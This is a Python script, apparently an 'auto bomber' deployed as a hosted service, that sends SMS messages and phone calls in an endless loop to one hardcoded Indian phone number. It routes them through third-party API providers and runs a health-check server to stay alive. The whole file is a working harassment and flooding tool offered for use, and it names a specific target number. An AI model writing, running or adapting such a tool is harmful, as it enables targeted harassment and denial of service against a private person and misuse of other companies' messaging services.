#!/usr/bin/python
import os, sys, json, time, string, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.server import HTTPServer, BaseHTTPRequestHandler
from colorama import Fore, Style
from utils.decorators import MessageDecorator
from utils.provider import APIProvider

class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"running")
    def log_message(self, *a): pass

def start_http():
    port = int(os.environ.get("PORT", 8080))
    HTTPServer(("0.0.0.0", port), HealthHandler).serve_forever()

t = threading.Thread(target=start_http, daemon=True)
t.start()

mesgdcrt = MessageDecorator("icon")

CC = "91"
TARGET = "7880393113"
DELAY = 1
THREADS = 3
SMS_LIMIT = 500
CALL_LIMIT = 15

def fmt(n):
    return ''.join(c for c in n if c in string.digits)

def bomb(mode, count):
    api = APIProvider(CC, TARGET, mode, delay=DELAY)
    if len(APIProvider.api_providers) == 0:
        mesgdcrt.FailureMessage(f"No APIs for {mode} on this target")
        return 0, 0
    success, failed = 0, 0
    mesgdcrt.SectionMessage(f"{mode.upper()} -> +{CC} {TARGET} x{count}")
    while success < count:
        with ThreadPoolExecutor(max_workers=THREADS) as ex:
            jobs = [ex.submit(api.hit) for _ in range(min(10, count - success))]
            for j in as_completed(jobs):
                r = j.result()
                if r is None:
                    mesgdcrt.WarningMessage("Limit reached, waiting 30s...")
                    time.sleep(30)
                    continue
                if r: success += 1
                else: failed += 1
                print(f"  {mode.upper()} | Sent: {success+failed} | OK: {success} | Fail: {failed}")
    return success, failed

mesgdcrt.SuccessMessage(f"T3RMUXK1NG Auto Bomber for +{CC} {TARGET}")
mesgdcrt.WarningMessage("SMS limit: 500 | Call limit: 15 | Delay: 5s | Loop: ON")
time.sleep(2)

cycle = 0
while True:
    cycle += 1
    print(f"\n{'='*60}")
    mesgdcrt.SectionMessage(f"CYCLE #{cycle} STARTING")
    print(f"{'='*60}\n")

    s_ok, s_fail = bomb("sms", SMS_LIMIT)
    mesgdcrt.GeneralMessage(f"SMS done: {s_ok} ok, {s_fail} failed")

    c_ok, c_fail = bomb("call", CALL_LIMIT)
    mesgdcrt.GeneralMessage(f"CALL done: {c_ok} ok, {c_fail} failed")

    mesgdcrt.SuccessMessage(f"CYCLE #{cycle} COMPLETE")
    mesgdcrt.WarningMessage("Restarting in 10 seconds...")
    time.sleep(10)
